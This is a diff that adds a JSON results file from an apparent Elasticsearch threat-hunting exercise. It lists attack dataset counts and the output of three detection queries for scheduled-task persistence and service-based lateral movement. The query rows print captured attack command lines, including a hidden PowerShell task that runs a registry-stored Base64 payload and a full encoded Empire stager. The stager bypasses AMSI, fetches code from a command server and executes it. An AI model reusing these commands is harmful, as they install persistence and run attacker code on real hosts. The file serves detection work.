@@ -1,0 +1,184 @@
+{
+  "verified_at_utc": "2026-11-11T11:30:52.719404+00:00",
+  "elasticsearch_version": "9.5.5",
+  "events": 78868,
+  "dataset_counts": {
+    "empire_schtasks_creation_execution_elevated_user": 59399,
+    "empire_psexec_dcerpc_tcp_svcctl": 4348,
+    "cmd_lsass_memory_dumpert_syscalls": 118,
+    "empire_mimikatz_logonpasswords": 6026,
+    "psh_lsass_memory_dump_comsvcs": 184,
+    "rdp_interactive_taskmanager_lsass_dump": 5489,
+    "cmd_mshta_vbscript_execute_psh": 1127,
+    "empire_launcher_vbs": 2067,
+    "psh_powershell_httplistener": 110
+  },
+  "results": [
+    {
+      "took": 20,
+      "is_partial": false,
+      "completion_time_in_millis": 1794396652661,
+      "documents_found": 1,
+      "values_loaded": 5,
+      "rows_emitted": 10,
+      "bytes_read": 0,
+      "read_nanos": 0,
+      "cpu_nanos": 5088553,
+      "start_time_in_millis": 1794396652641,
+      "expiration_time_in_millis": 1794828652462,
+      "columns": [
+        {
+          "name": "@timestamp",
+          "type": "date"
+        },
+        {
+          "name": "dataset",
+          "type": "keyword"
+        },
+        {
+          "name": "Hostname",
+          "type": "keyword"
+        },
+        {
+          "name": "SubjectUserName",
+          "type": "keyword"
+        },
+        {
+          "name": "TaskName",
+          "type": "keyword"
+        }
+      ],
+      "values": [
+        [
+          "2020-09-21T21:58:19.640Z",
+          "empire_schtasks_creation_execution_elevated_user",
+          "WORKSTATION5.theshire.local",
+          "pgustavo",
+          "\\MordorElevated"
+        ]
+      ],
+      "query_file": "det-schtasks-persistence.esql"
+    },
+    {
+      "took": 35,
+      "is_partial": false,
+      "completion_time_in_millis": 1794396652699,
+      "documents_found": 2,
+      "values_loaded": 12,
+      "rows_emitted": 28,
+      "bytes_read": 0,
+      "read_nanos": 0,
+      "cpu_nanos": 21585342,
+      "start_time_in_millis": 1794396652664,
+      "expiration_time_in_millis": 1794828652662,
+      "columns": [
+        {
+          "name": "@timestamp",
+          "type": "date"
+        },
+        {
+          "name": "dataset",
+          "type": "keyword"
+        },
+        {
+          "name": "Hostname",
+          "type": "keyword"
+        },
+        {
+          "name": "User",
+          "type": "keyword"
+        },
+        {
+          "name": "ParentImage",
+          "type": "keyword"
+        },
+        {
+          "name": "CommandLine",
+          "type": "keyword"
+        }
+      ],
+      "values": [
+        [
+          "2020-09-21T21:58:18.599Z",
+          "empire_schtasks_creation_execution_elevated_user",
+          "WORKSTATION5.theshire.local",
+          "THESHIRE\\pgustavo",
+          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /RU system /SC ONLOGON /TN MordorElevated /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\Software\\Microsoft\\Network debug).debug)))\\\"\""
+        ],
+        [
+          "2020-09-21T21:58:18.653Z",
+          "empire_schtasks_creation_execution_elevated_user",
+          "WORKSTATION5.theshire.local",
+          null,
+          null,
+          "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /RU system /SC ONLOGON /TN MordorElevated /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\Software\\Microsoft\\Network debug).debug)))\\\"\""
+        ]
+      ],
+      "query_file": "det-schtasks-process.esql"
+    },
+    {
+      "took": 15,
+      "is_partial": false,
+      "completion_time_in_millis": 1794396652717,
+      "documents_found": 1,
+      "values_loaded": 5,
+      "rows_emitted": 10,
+      "bytes_read": 0,
+      "read_nanos": 0,
+      "cpu_nanos": 3716379,
+      "start_time_in_millis": 1794396652702,
+      "expiration_time_in_millis": 1794828652662,
+      "columns": [
+        {
+          "name": "@timestamp",
+          "type": "date"
+        },
+        {
+          "name": "dataset",
+          "type": "keyword"
+        },
+        {
+          "name": "Hostname",
+          "type": "keyword"
+        },
+        {
+          "name": "ServiceName",
+          "type": "keyword"
+        },
+        {
+          "name": "ImagePath",
+          "type": "keyword"
+        }
+      ],
+      "values": [
+        [
+          "2020-09-20T16:16:58.233Z",
+          "empire_psexec_dcerpc_tcp_svcctl",
+          "WORKSTATION6.theshire.local",
+          "Updater",
+          "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyACkAewAkADcAMQAyAEQAQgA9ACQANAAzAEQARQAyAC4ARwBlAHQAVgBhAEwAdQBFACgAJABOAHUAbABsACkAOwBJAGYAKAAkADcAMQAyAEQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAGQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBEAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAEEAbAA9AFsAQwBvAEwATABFAEMAVABJAE8AbgBzAC4ARwBlAG4AZQByAGkAYwAuAEQASQBDAHQASQBPAG4AYQByAHkAWwBzAHQAcgBpAG4ARwAsAFMAeQBzAHQAZQBNAC4ATwBCAEoARQBDAHQAXQBdADoAOgBOAGUAdwAoACkAOwAkAHYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBsAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABCAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBMAH0ARQBMAHMARQB7AFsAUwBDAFIAaQBQAFQAQgBMAG8AQwBrAF0ALgAiAEcARQBUAEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAE4AdQBsAGwALAAoAE4ARQB3AC0ATwBCAEoARQBDAFQAIABDAE8AbABsAEUAYwBUAGkATwBOAHMALgBHAGUAbgBFAFIASQBDAC4ASABBAHMAaABTAGUAdABbAFMAdABSAGkAbgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBFAEYAXQAuAEEAcwBzAEUATQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAEwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAeQBTAFQAZQBtAC4ATgBFAHQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AdABNAEEATgBBAGcARQBSAF0AOgA6AEUAWABwAGUAYwB0ADEAMAAwAEMAbwBOAHQASQBuAHUARQA9ADAAOwAkADgAZgA1AEIAOQA9AE4ARQBXAC0ATwBiAGoAZQBjAHQAIABTAFkAUwBUAGUATQAuAE4AZQB0AC4AVwBFAEIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AYwBPAGQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQARQAuAEcARQBUAFMAVAByAGkAbgBnACgAWwBDAG8AbgBWAEUAcgB0AF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AHIAaQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADgAZgA1AEIAOQAuAEgAZQBhAEQAZQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADgAZgA1AGIAOQAuAFAAcgBPAHgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAFUARQBzAHQAXQA6ADoARABlAGYAYQBVAEwAdABXAGUAYgBQAFIATwB4AFkAOwAkADgARgA1AGIAOQAuAFAAcgBPAFgAeQAuAEMAcgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBTAHQAZQBtAC4ATgBlAHQALgBDAFIAZQBEAGUATgBUAEkAQQBsAEMAYQBDAEgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4ARQBUAHcATwByAGsAQwByAEUARABFAE4AVABpAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADgAZgA1AGIAOQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABFAG0ALgBUAGUAeABUAC4ARQBuAGMAbwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAcwAoACcAMABdAHIAWAAzAFkANAA6ACgAKQBKAGMAaABBAEsAawBSADcAVgBnACsAWwAvAFUAcAA5ADIAdABtAEcAUQB2ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAOABmADUAQgA5AC4ASABlAGEARABFAFIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AFAARgBqAE4AMQBIAHAAcgAyAE4ANwBiAGEAZgBlAGMAdwBXAC8ARwBiAG8AUwBNAHoAZwA0AD0AIgApADsAJABEAGEAdABBAD0AJAA4AGYANQBCADkALgBEAE8AVwBuAGwATwBhAGQARABBAFQAQQAoACQAcwBFAHIAKwAkAHQAKQA7ACQAaQBWAD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABEAEEAdABBAFsANAAuAC4AJABEAEEAdABhAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAEkATgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA="
+        ]
+      ],
+      "query_file": "det-service-lateral.esql"
+    }
+  ],
+  "cluster_health": {
+    "cluster_name": "threat-hunting-week9",
+    "status": "green",
+    "timed_out": false,
+    "number_of_nodes": 1,
+    "number_of_data_nodes": 1,
+    "active_primary_shards": 3,
+    "active_shards": 3,
+    "relocating_shards": 0,
+    "initializing_shards": 0,
+    "unassigned_shards": 0,
+    "unassigned_primary_shards": 0,
+    "delayed_unassigned_shards": 0,
+    "number_of_pending_tasks": 0,
+    "number_of_in_flight_fetch": 0,
+    "task_max_waiting_in_queue_millis": 0,
+    "active_shards_percent_as_number": 100.0
+  }
+}
